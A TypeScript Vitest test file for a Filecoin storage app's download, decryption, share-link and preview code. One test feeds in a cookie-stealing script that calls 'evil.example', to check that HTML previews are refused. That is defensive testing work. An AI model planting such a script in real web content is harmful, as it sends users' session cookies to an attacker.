// @vitest-environment node

import { decodeGrant, keyForEnvelope, keyspaceKeys, unwrapWith } from '@filoz/keysmith'
import { calculate } from '@filoz/synapse-core/piece'
import type { Synapse } from '@filoz/synapse-sdk'
import { CarWriter } from '@ipld/car'
import * as fee from 'filecoin-encryption-envelope'
import { base64url } from 'multiformats/bases/base64'
import { CID } from 'multiformats/cid'
import { sha256 } from 'multiformats/hashes/sha2'
import { bytesToHex } from 'viem'
import { generatePrivateKey, privateKeyToAccount } from 'viem/accounts'
import { beforeEach, describe, expect, it, vi } from 'vitest'
// Node selects the filesystem export; exercise the same browser builder Vite uses.
import {
  createCarFromFile,
  createCarFromFileList,
} from '../../../node_modules/filecoin-pin/dist/core/unixfs/browser.js'
import type { DatasetPiece } from '../../hooks/use-dataset-pieces.ts'
import {
  type DecryptCredentials,
  decryptWithCredentials,
  downloadFile,
  encryptedPieceShareLink,
  previewBlob,
  unpackFile,
} from './download.ts'
import { wrapCarPayload } from './encrypted-payload.ts'
import {
  clearRememberedOwnerKeys,
  decryptEnvelope,
  encryptCar,
  issueEncryptionCredential,
  type OwnerSigner,
} from './encryption.ts'
import { contentReader } from './ipfs-content.ts'

describe('original file retrieval', () => {
  it('round-trips a multi-block UnixFS CAR produced by the actual upload library', async () => {
    const bytes = Uint8Array.from({ length: 2 * 1024 * 1024 + 123 }, (_, index) => index % 251)
    const car = await createCarFromFile(new File([bytes], '研究.bin'))
    const downloaded = await unpackFile(car.carBytes, car.rootCid.toString())
    expect(Buffer.compare(Buffer.from(await downloaded.arrayBuffer()), Buffer.from(bytes))).toBe(0)
  })

  it('round-trips an empty file without downloading the CAR envelope', async () => {
    const car = await createCarFromFile(new File([], 'empty.txt'))
    const downloaded = await unpackFile(car.carBytes, car.rootCid.toString())
    expect(downloaded.size).toBe(0)
  })

  it('extracts file bytes rather than saving the CAR wrapper', async () => {
    const bytes = new TextEncoder().encode('hello Filecoin')
    const root = CID.createV1(0x55, await sha256.digest(bytes))
    const { writer, out } = CarWriter.create([root])
    const chunks: Uint8Array[] = []
    const drain = (async () => {
      for await (const chunk of out) chunks.push(chunk)
    })()
    await writer.put({ cid: root, bytes })
    await writer.close()
    await drain
    const car = new Uint8Array(chunks.reduce((sum, chunk) => sum + chunk.length, 0))
    let offset = 0
    for (const chunk of chunks) {
      car.set(chunk, offset)
      offset += chunk.length
    }
    const file = await unpackFile(car, root.toString())
    const buffer = await file.arrayBuffer()
    expect(new Uint8Array(buffer)).toEqual(bytes)
    const otherRoot = CID.createV1(0x55, await sha256.digest(new Uint8Array([9])))
    await expect(unpackFile(car, otherRoot.toString())).rejects.toThrow('expected root CID')
  })
})

it('downloads an imported archive as the original CAR bytes rather than its inner file', async () => {
  const { downloadFile } = await import('./download.ts')
  const car = await createCarFromFile(new File(['inside the archive'], 'inside.txt'))
  const blobs: Blob[] = []
  const anchor = { href: '', download: '', click: vi.fn(), remove: vi.fn() }
  vi.stubGlobal('document', { createElement: () => anchor, body: { append: vi.fn() } })
  const createUrl = vi.spyOn(URL, 'createObjectURL').mockImplementation((blob) => {
    if (blob instanceof Blob) blobs.push(blob)
    return 'blob:archive'
  })
  vi.useFakeTimers()
  try {
    const synapse = { storage: { createContext: async () => ({ download: async () => car.carBytes }) } }
    await downloadFile(
      synapse as unknown as import('@filoz/synapse-sdk').Synapse,
      {
        cid: car.rootCid.toString(),
        pieceCid: 'piece',
        datasetId: '1',
        fileName: 'original.car',
        importedCar: true,
      } as import('../../hooks/use-dataset-pieces.ts').DatasetPiece
    )
    expect(anchor.download).toBe('original.car')
    expect(blobs).toHaveLength(1)
    expect(new Uint8Array(await blobs[0].arrayBuffer())).toEqual(car.carBytes)
    expect(blobs[0].type).toBe('application/vnd.ipld.car')
  } finally {
    vi.clearAllTimers()
    vi.useRealTimers()
    createUrl.mockRestore()
    vi.unstubAllGlobals()
  }
})

it.each([false, true])(
  'downloads and validates a parked piece without resolving a dataset (CAR: %s)',
  async (importedCar) => {
    const { calculate } = await import('@filoz/synapse-core/piece')
    const { downloadFile } = await import('./download.ts')
    const original = new File(['already on the SP'], 'sample.txt')
    const car = await createCarFromFile(original)
    const pieceCid = (await calculate(car.carBytes)).toString()
    const fetchMock = vi.fn().mockImplementation(async () => new Response(new Uint8Array(car.carBytes)))
    vi.stubGlobal('fetch', fetchMock)
    const blobs: Blob[] = []
    const createUrl = vi.spyOn(URL, 'createObjectURL').mockImplementation((blob) => {
      blobs.push(blob as Blob)
      return 'blob:parked'
    })
    const anchor = { href: '', download: '', click: vi.fn(), remove: vi.fn() }
    vi.stubGlobal('document', { createElement: () => anchor, body: { append: vi.fn() } })
    const createContext = vi.fn()
    vi.useFakeTimers()
    try {
      await downloadFile({ storage: { createContext } } as unknown as import('@filoz/synapse-sdk').Synapse, {
        id: 'parked',
        importedCar,
        fileName: importedCar ? 'sample.car' : original.name,
        fileSize: '1 KB',
        cid: car.rootCid.toString(),
        pieceCid,
        datasetId: '',
        datasetIds: [],
        providerId: '4',
        providerName: 'SP',
        serviceURL: 'https://sp.example',
        transactionHash: '',
        network: 'mainnet',
        uploadedAt: 1,
        upload: {
          phase: 'confirming',
          expectedCopies: 2,
          steps: [],
          checks: 0,
          nextCheckAt: 0,
          providers: [{ providerId: '4', serviceURL: 'https://sp.example', stored: true }],
        },
      })
      expect(createContext).not.toHaveBeenCalled()
      expect((fetchMock.mock.calls[0][0] as Request).url).toContain(`/piece/${pieceCid}`)
      expect(new Uint8Array(await blobs[0].arrayBuffer())).toEqual(
        importedCar ? car.carBytes : new Uint8Array(await original.arrayBuffer())
      )
    } finally {
      vi.clearAllTimers()
      vi.useRealTimers()
      createUrl.mockRestore()
      vi.unstubAllGlobals()
    }
  }
)

describe('encrypted piece retrieval', () => {
  const OWNER_PRIVATE_KEY = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80' as const

  // The remembered-key cache spans the page session; isolate it per test.
  beforeEach(() => clearRememberedOwnerKeys())

  function owner(): OwnerSigner & { signatures: () => number } {
    const account = privateKeyToAccount(OWNER_PRIVATE_KEY)
    const signTypedData = vi.fn((args: Parameters<typeof account.signTypedData>[0]) => account.signTypedData(args))
    return {
      address: account.address,
      signTypedData: signTypedData as never,
      signatures: () => signTypedData.mock.calls.length,
    }
  }

  /** Real crypto end to end: credential, FEE envelope, and the outer CAR the chain records. */
  async function encrypted(innerCarBytes: Uint8Array) {
    const signer = owner()
    const sessionPrivateKey = generatePrivateKey()
    const credential = await issueEncryptionCredential(signer, sessionPrivateKey)
    const envelope = await encryptCar(sessionPrivateKey, credential, innerCarBytes)
    const outer = await createCarFromFile(new File([envelope as BlobPart], 'encrypted.fee'))
    return { sessionPrivateKey, credential, envelope, outer }
  }

  const selected = (path: string, contents: string) => {
    const file = new File([contents], path.split('/').at(-1) ?? '')
    Object.defineProperty(file, 'webkitRelativePath', { value: path })
    return file
  }

  const directoryCar = () =>
    createCarFromFileList([
      selected('reports/研究.txt', 'hello folder'),
      selected('reports/docs/notes.txt', 'nested notes'),
    ])

  const synapseFor = (carBytes: Uint8Array) =>
    ({ storage: { createContext: async () => ({ download: async () => carBytes }) } }) as unknown as Synapse

  const piece = (overrides: Partial<DatasetPiece>): DatasetPiece =>
    ({
      id: 'encrypted',
      fileName: 'secret.bin',
      fileSize: '1 KB',
      pieceCid: 'piece',
      providerName: 'SP',
      datasetId: '7',
      providerId: '4',
      serviceURL: '',
      transactionHash: '',
      network: 'calibration',
      uploadedAt: 1,
      encrypted: true,
      ...overrides,
    }) as DatasetPiece

  function captureSaves() {
    const anchor = { href: '', download: '', click: vi.fn(), remove: vi.fn() }
    vi.stubGlobal('document', { createElement: () => anchor, body: { append: vi.fn() } })
    const blobs: Blob[] = []
    const createUrl = vi.spyOn(URL, 'createObjectURL').mockImplementation((blob) => {
      blobs.push(blob as Blob)
      return 'blob:save'
    })
    vi.useFakeTimers()
    return {
      anchor,
      blobs,
      restore() {
        vi.clearAllTimers()
        vi.useRealTimers()
        createUrl.mockRestore()
        vi.unstubAllGlobals()
      },
    }
  }

  it('decrypts through the session grant silently and saves the original bytes', async () => {
    const original = Uint8Array.from({ length: 3000 }, (_, index) => index % 199)
    const inner = await createCarFromFile(new File([original], 'secret.bin'))
    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
    const save = captureSaves()
    const stages: string[] = []
    try {
      await downloadFile(
        synapseFor(outer.carBytes),
        piece({ cid: outer.rootCid.toString() }),
        { session: { privateKey: sessionPrivateKey, credential } },
        (stage) => stages.push(stage)
      )
      expect(stages).toContain('downloading')
      expect(stages).not.toContain('unlocking')
      expect(save.anchor.download).toBe('secret.bin')
      expect(new Uint8Array(await save.blobs[0].arrayBuffer())).toEqual(original)
    } finally {
      save.restore()
    }
  })

  it('saves a decrypted imported archive byte-exact as the original CAR', async () => {
    const archive = await createCarFromFile(new File(['inside the archive'], 'inside.txt'))
    const { sessionPrivateKey, credential, outer } = await encrypted(archive.carBytes)
    const save = captureSaves()
    try {
      await downloadFile(
        synapseFor(outer.carBytes),
        piece({ cid: outer.rootCid.toString(), fileName: 'original.car', importedCar: true }),
        { session: { privateKey: sessionPrivateKey, credential } }
      )
      expect(save.anchor.download).toBe('original.car')
      expect(new Uint8Array(await save.blobs[0].arrayBuffer())).toEqual(archive.carBytes)
      expect(save.blobs[0].type).toBe('application/vnd.ipld.car')
    } finally {
      save.restore()
    }
  })

  it('extracts one file from an encrypted directory by decrypting the whole envelope', async () => {
    const inner = await directoryCar()
    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
    const save = captureSaves()
    try {
      await downloadFile(
        synapseFor(outer.carBytes),
        piece({
          cid: 'bafy-child-selection',
          fileName: 'notes.txt',
          directoryEntry: { rootCid: outer.rootCid.toString(), path: 'docs/notes.txt' },
        }),
        { session: { privateKey: sessionPrivateKey, credential } }
      )
      expect(save.anchor.download).toBe('notes.txt')
      expect(await save.blobs[0].text()).toBe('nested notes')
    } finally {
      save.restore()
    }
  })

  it('surfaces tampering as a modification error without falling back to the owner wallet', async () => {
    const inner = await createCarFromFile(new File(['sensitive'], 'secret.bin'))
    const { sessionPrivateKey, credential, envelope } = await encrypted(inner.carBytes)
    envelope[envelope.length - 1] ^= 0xff
    const tampered = await createCarFromFile(new File([envelope as BlobPart], 'encrypted.fee'))
    const wallet = owner()
    const save = captureSaves()
    try {
      await expect(
        downloadFile(synapseFor(tampered.carBytes), piece({ cid: tampered.rootCid.toString() }), {
          session: { privateKey: sessionPrivateKey, credential },
          ownerSigner: () => wallet,
          commitment: credential.commitment,
        })
      ).rejects.toThrow(/modified/)
      expect(wallet.signatures()).toBe(0)
    } finally {
      save.restore()
    }
  })

  it('falls back to the owner wallet when the grant is for another session key', async () => {
    const original = new TextEncoder().encode('readable by the owner')
    const inner = await createCarFromFile(new File([original], 'secret.bin'))
    const { credential, outer } = await encrypted(inner.carBytes)
    const wallet = owner()
    const save = captureSaves()
    const stages: string[] = []
    try {
      await downloadFile(
        synapseFor(outer.carBytes),
        piece({ cid: outer.rootCid.toString() }),
        {
          session: { privateKey: generatePrivateKey(), credential },
          ownerSigner: () => wallet,
          commitment: credential.commitment,
        },
        (stage) => stages.push(stage)
      )
      expect(stages).toContain('unlocking')
      expect(new Uint8Array(await save.blobs[0].arrayBuffer())).toEqual(original)
    } finally {
      save.restore()
    }
  })

  it('unlocks with the owner wallet in one signature when the commitment is known', async () => {
    const original = new TextEncoder().encode('no grant, wallet only')
    const inner = await createCarFromFile(new File([original], 'secret.bin'))
    const { credential, outer } = await encrypted(inner.carBytes)
    const wallet = owner()
    const save = captureSaves()
    const stages: string[] = []
    try {
      await downloadFile(
        synapseFor(outer.carBytes),
        piece({ cid: outer.rootCid.toString() }),
        { ownerSigner: async () => wallet, commitment: credential.commitment },
        (stage) => stages.push(stage)
      )
      expect(stages).toContain('unlocking')
      expect(wallet.signatures()).toBe(1)
      expect(new Uint8Array(await save.blobs[0].arrayBuffer())).toEqual(original)
    } finally {
      save.restore()
    }
  })

  it('names the owning wallet when no grant and no signer are available', async () => {
    const inner = await createCarFromFile(new File(['locked'], 'secret.bin'))
    const { credential, outer } = await encrypted(inner.carBytes)
    const save = captureSaves()
    try {
      await expect(
        downloadFile(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString() }), {})
      ).rejects.toThrow(new RegExp(`${credential.owner}.*Connect that wallet`))
    } finally {
      save.restore()
    }
  })

  it.each(['session', 'owner', 'stale grant'] as const)(
    'browses an encrypted directory with %s access and reuses the opened envelope',
    async (mode) => {
      const inner = await directoryCar()
      const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
      const pieceCid = (await calculate(outer.carBytes)).toString()
      const fetchMock = vi.fn().mockImplementation(async () => new Response(new Uint8Array(outer.carBytes)))
      vi.stubGlobal('fetch', fetchMock)
      try {
        const file = piece({
          id: 'directory',
          cid: outer.rootCid.toString(),
          pieceCid,
          fileName: 'reports',
          isDirectory: true,
          upload: {
            phase: 'confirming',
            expectedCopies: 1,
            steps: [],
            checks: 0,
            nextCheckAt: 0,
            providers: [{ providerId: '4', serviceURL: 'https://sp.example', stored: true }],
          },
        })
        const signer = owner()
        const credentials: DecryptCredentials =
          mode === 'session'
            ? { session: { privateKey: sessionPrivateKey, credential } }
            : mode === 'owner'
              ? { ownerSigner: () => signer }
              : { session: { privateKey: generatePrivateKey(), credential }, ownerSigner: () => signer }
        const reader = contentReader(file, new AbortController().signal, false, credentials)
        expect(reader.rootCid).toBe(outer.rootCid.toString())
        const entry = await reader.entry('docs/notes.txt')
        if (entry.type !== 'file' && entry.type !== 'raw' && entry.type !== 'identity')
          throw new Error('expected a single-file entry')
        const chunks: Uint8Array[] = []
        for await (const chunk of entry.content()) chunks.push(new Uint8Array(chunk))
        expect(Buffer.concat(chunks).toString()).toBe('nested notes')
        const fetches = fetchMock.mock.calls.length
        const signatures = signer.signatures()
        expect(signatures).toBe(mode === 'session' ? 0 : mode === 'stale grant' ? 1 : 2)
        await reader.entry('研究.txt')
        expect(fetchMock.mock.calls.length).toBe(fetches)
        expect(signer.signatures()).toBe(signatures)
      } finally {
        vi.unstubAllGlobals()
      }
    }
  )

  it('stops a cancelled directory unlock before the next signature and does not retain its key', async () => {
    const inner = await directoryCar()
    const { outer, credential } = await encrypted(inner.carBytes)
    const pieceCid = (await calculate(outer.carBytes)).toString()
    vi.stubGlobal(
      'fetch',
      vi.fn(async () => new Response(new Uint8Array(outer.carBytes)))
    )
    const controller = new AbortController()
    const wallet = owner()
    const signer: OwnerSigner = {
      address: wallet.address,
      signTypedData: async (args) => {
        const signature = await wallet.signTypedData(args)
        controller.abort()
        return signature
      },
    }
    const file = piece({ cid: outer.rootCid.toString(), pieceCid, serviceURL: 'https://sp.example', isDirectory: true })
    try {
      const reader = contentReader(file, controller.signal, false, { ownerSigner: () => signer })
      await expect(reader.entry()).rejects.toMatchObject({ name: 'AbortError' })
      expect(wallet.signatures()).toBe(1)
      const fresh = owner()
      const retried = contentReader(file, new AbortController().signal, false, {
        ownerSigner: () => fresh,
        commitment: credential.commitment,
      })
      expect(['file', 'raw', 'identity']).toContain((await retried.entry('docs/notes.txt')).type)
      expect(fresh.signatures()).toBe(1)
    } finally {
      vi.unstubAllGlobals()
    }
  })

  async function otherGroupSession() {
    const wallet = owner()
    const privateKey = generatePrivateKey()
    const groupKeyId = `0x${'ab'.repeat(16)}` as const
    const keys = await keyspaceKeys(wallet, { owner: wallet.address, keyspace: groupKeyId })
    try {
      const credential = await issueEncryptionCredential(wallet, privateKey, {
        groupKeyId,
        commitment: keys.commitment,
      })
      return { privateKey, credential }
    } finally {
      keys.kk.fill(0)
    }
  }

  it('decrypts another group with owner signatures instead of the active session commitment', async () => {
    const inner = await directoryCar()
    const { envelope } = await encrypted(inner.carBytes)
    const session = await otherGroupSession()
    const wallet = owner()
    const credentials: DecryptCredentials = {
      session,
      commitment: session.credential.commitment,
      ownerSigner: () => wallet,
    }
    expect(await decryptWithCredentials(envelope, credentials)).toEqual(inner.carBytes)
    expect(wallet.signatures()).toBe(2)
  })

  it('uses the matching commitment for an expired grant and still refuses a wrong matching commitment', async () => {
    const inner = await directoryCar()
    const { envelope, credential } = await encrypted(inner.carBytes)
    const wallet = owner()
    expect(
      await decryptWithCredentials(envelope, {
        session: { privateKey: generatePrivateKey(), credential },
        ownerSigner: () => wallet,
      })
    ).toEqual(inner.carBytes)
    expect(wallet.signatures()).toBe(1)
    clearRememberedOwnerKeys()
    const other = await otherGroupSession()
    await expect(
      decryptWithCredentials(envelope, {
        session: {
          privateKey: generatePrivateKey(),
          credential: { ...credential, commitment: other.credential.commitment },
        },
        ownerSigner: () => owner(),
      })
    ).rejects.toThrow(/commitment/)
  })

  it('mints a decryptable share for another group without reusing the session commitment', async () => {
    const inner = await directoryCar()
    const { envelope, outer } = await encrypted(inner.carBytes)
    const session = await otherGroupSession()
    const wallet = owner()
    const link = await encryptedPieceShareLink(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString() }), {
      session,
      commitment: session.credential.commitment,
      ownerSigner: () => wallet,
    })
    expect(wallet.signatures()).toBe(2)
    const params = new URLSearchParams(link.split('&').slice(1).join('&'))
    const accessKey = params.get('k')
    const payload = params.get('d')
    if (!accessKey || !payload) throw new Error('Share link is missing its access key or grant.')
    const throwaway = bytesToHex(base64url.baseDecode(accessKey.slice('fak1_'.length)))
    const grant = decodeGrant(base64url.baseDecode(payload))
    const key = await unwrapWith(throwaway, grant)
    const info = await fee.parse(envelope)
    expect(await decryptEnvelope(envelope, () => keyForEnvelope(key, info.appMetadata as never, grant))).toEqual(
      inner.carBytes
    )
  })

  it('refuses to browse an encrypted directory without a grant instead of prompting the wallet', async () => {
    const reader = contentReader(piece({ cid: 'bafy-outer', isDirectory: true }), new AbortController().signal)
    await expect(reader.entry('docs/notes.txt')).rejects.toThrow('Connect your wallet to browse this encrypted folder.')
  })

  it('mints a share link by reading the stored envelope labels, openable with the link alone', async () => {
    const inner = await createCarFromFile(new File(['shared secret'], 'notes.txt'))
    const { sessionPrivateKey, credential, envelope, outer } = await encrypted(inner.carBytes)
    const link = await encryptedPieceShareLink(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString() }), {
      session: { privateKey: sessionPrivateKey, credential },
    })
    expect(link).toContain(`#v1/${outer.rootCid.toString()}&d=`)
    // Open it exactly as the viewer does: T from the fragment unwraps the payload.
    const fragment = link.split('#')[1]
    const params = Object.fromEntries(
      fragment
        .slice(`v1/${outer.rootCid.toString()}&`.length)
        .split('&')
        .map((part) => part.split('=') as [string, string])
    )
    const throwaway = bytesToHex(base64url.baseDecode(params.k.slice('fak1_'.length)))
    const grant = decodeGrant(base64url.baseDecode(params.d))
    const key = await unwrapWith(throwaway, grant)
    const info = await fee.parse(envelope)
    const plaintext = await decryptEnvelope(envelope, () => keyForEnvelope(key, info.appMetadata as never, grant))
    expect(plaintext).toEqual(inner.carBytes)
  })

  it('shares the outer encrypted upload when a nested directory entry is selected', async () => {
    const inner = await directoryCar()
    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
    const selected = piece({
      cid: 'bafy-inner-child',
      fileName: 'notes.txt',
      directoryEntry: { rootCid: outer.rootCid.toString(), path: 'docs/notes.txt' },
    })
    const sessionLink = await encryptedPieceShareLink(synapseFor(outer.carBytes), selected, {
      session: { privateKey: sessionPrivateKey, credential },
    })
    const ownerLink = await encryptedPieceShareLink(synapseFor(outer.carBytes), selected, {
      ownerSigner: () => owner(),
    })
    for (const link of [sessionLink, ownerLink]) {
      expect(link).toContain(`#v1/${outer.rootCid.toString()}&d=`)
      expect(link).not.toContain('bafy-inner-child')
    }
  })

  it('refuses to mint a share link for a plaintext piece', async () => {
    const plain = await createCarFromFile(new File(['public'], 'open.txt'))
    await expect(
      encryptedPieceShareLink(synapseFor(plain.carBytes), piece({ cid: plain.rootCid.toString(), encrypted: false }), {
        session: {
          privateKey: generatePrivateKey(),
          credential: {
            grant: 'mAA',
            groupKeyId: `0x${'a'.repeat(32)}`,
            commitment: 'v1.x',
            owner: '0x0000000000000000000000000000000000000000',
          },
        },
      })
    ).rejects.toThrow(/not an encrypted upload/i)
  })

  it('mints a share link from the owner wallet alone when no grant exists', async () => {
    const inner = await createCarFromFile(new File(['no grant here'], 'solo.txt'))
    const { credential, envelope, outer } = await encrypted(inner.carBytes)
    const wallet = owner()
    const link = await encryptedPieceShareLink(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString() }), {
      ownerSigner: () => wallet,
      commitment: credential.commitment,
    })
    expect(wallet.signatures()).toBe(1)
    const fragment = link.split('#')[1]
    const params = Object.fromEntries(
      fragment
        .slice(`v1/${outer.rootCid.toString()}&`.length)
        .split('&')
        .map((part) => part.split('=') as [string, string])
    )
    const throwaway = bytesToHex(base64url.baseDecode(params.k.slice('fak1_'.length)))
    const grant = decodeGrant(base64url.baseDecode(params.d))
    const key = await unwrapWith(throwaway, grant)
    const info = await fee.parse(envelope)
    const plaintext = await decryptEnvelope(envelope, () => keyForEnvelope(key, info.appMetadata as never, grant))
    expect(plaintext).toEqual(inner.carBytes)
  })

  it('returns a typed plaintext blob for client-side preview of an encrypted file', async () => {
    const bytes = new TextEncoder().encode('%PDF-1.4 preview body')
    const inner = await createCarFromFile(new File([bytes], 'paper.pdf'))
    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
    const blob = await previewBlob(
      synapseFor(outer.carBytes),
      piece({ cid: outer.rootCid.toString(), fileName: 'paper.pdf' }),
      { session: { privateKey: sessionPrivateKey, credential } }
    )
    expect(blob.type).toBe('application/pdf')
    expect(new Uint8Array(await blob.arrayBuffer())).toEqual(bytes)
  })
  it('refuses to produce a same-origin-executable preview blob for HTML or SVG, even though they decrypt fine', async () => {
    const bytes = new TextEncoder().encode('<script>fetch("https://evil.example?"+document.cookie)</script>')
    const inner = await createCarFromFile(new File([bytes as BlobPart], 'card.html'))
    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
    await expect(
      previewBlob(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString(), fileName: 'card.html' }), {
        session: { privateKey: sessionPrivateKey, credential },
      })
    ).rejects.toThrow(/no in-browser preview/i)
  })

  it('previews a single child of an encrypted folder from the decrypted payload', async () => {
    const child = new File(['# notes'], 'notes.md')
    Object.defineProperty(child, 'webkitRelativePath', { value: 'docs/notes.md' })
    const base = await createCarFromFileList([child])
    // New uploads ship the filecoin-pin payload profile: wrapper dir -> 'docs' -> entries.
    const payload = await wrapCarPayload(base, 'docs')
    const { sessionPrivateKey, credential, outer } = await encrypted(payload.carBytes)
    const blob = await previewBlob(
      synapseFor(outer.carBytes),
      piece({
        cid: outer.rootCid.toString(),
        fileName: 'notes.md',
        directoryEntry: { rootCid: outer.rootCid.toString(), path: 'notes.md' },
      }),
      { session: { privateKey: sessionPrivateKey, credential } }
    )
    expect(blob.type).toBe('text/plain')
    expect(await blob.text()).toBe('# notes')
  })

  it('downloads a legacy encrypted piece (no wrapper directory) exactly as before', async () => {
    const bytes = new TextEncoder().encode('legacy plain layout')
    const inner = await createCarFromFile(new File([bytes as BlobPart], 'old.bin'))
    const { sessionPrivateKey, credential, outer } = await encrypted(inner.carBytes)
    const save = captureSaves()
    try {
      await downloadFile(synapseFor(outer.carBytes), piece({ cid: outer.rootCid.toString(), fileName: 'old.bin' }), {
        session: { privateKey: sessionPrivateKey, credential },
      })
      expect(new Uint8Array(await save.blobs[0].arrayBuffer())).toEqual(bytes)
    } finally {
      save.restore()
    }
  })
})

describe('preview with an expired session (owner wallet only)', () => {
  beforeEach(() => clearRememberedOwnerKeys())

  it('re-derives from the piece itself with one signature, then previews silently', async () => {
    const account = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
    const signTypedData = vi.fn((args: Parameters<typeof account.signTypedData>[0]) => account.signTypedData(args))
    const wallet = { address: account.address, signTypedData: signTypedData as never }
    const sessionPrivateKey = generatePrivateKey()
    const credential = await issueEncryptionCredential(wallet, sessionPrivateKey)
    const first = await encryptCar(
      sessionPrivateKey,
      credential,
      (await createCarFromFile(new File(['one'], 'a.txt'))).carBytes
    )
    const second = await encryptCar(
      sessionPrivateKey,
      credential,
      (await createCarFromFile(new File(['two'], 'b.txt'))).carBytes
    )
    const outer = async (envelope: Uint8Array) => createCarFromFile(new File([envelope as BlobPart], 'encrypted.fee'))
    const firstOuter = await outer(first)
    const secondOuter = await outer(second)
    const synapseFor = (bytes: Uint8Array) =>
      ({ storage: { createContext: async () => ({ download: async () => bytes }) } }) as unknown as Synapse
    const piece = (cid: string, fileName: string): DatasetPiece =>
      ({
        id: cid,
        cid,
        fileName,
        fileSize: '1 KB',
        pieceCid: 'p',
        providerName: '',
        datasetId: '7',
        providerId: '4',
        serviceURL: '',
        transactionHash: '',
        network: 'calibration',
        uploadedAt: 1,
        encrypted: true,
      }) as DatasetPiece
    const baseline = signTypedData.mock.calls.length
    const stages: string[] = []
    // No session credentials at all: the wallet alone must open the piece.
    const credentials: DecryptCredentials = { ownerSigner: () => wallet, commitment: credential.commitment }
    const blob = await previewBlob(
      synapseFor(firstOuter.carBytes),
      piece(firstOuter.rootCid.toString(), 'a.txt'),
      credentials,
      (stage) => stages.push(stage)
    )
    expect(await blob.text()).toBe('one')
    expect(stages).toContain('unlocking')
    expect(signTypedData.mock.calls.length - baseline).toBe(1)
    // Second preview under the same group key: remembered, zero new signatures.
    const again = await previewBlob(
      synapseFor(secondOuter.carBytes),
      piece(secondOuter.rootCid.toString(), 'b.txt'),
      credentials
    )
    expect(await again.text()).toBe('two')
    expect(signTypedData.mock.calls.length - baseline).toBe(1)
  })
})
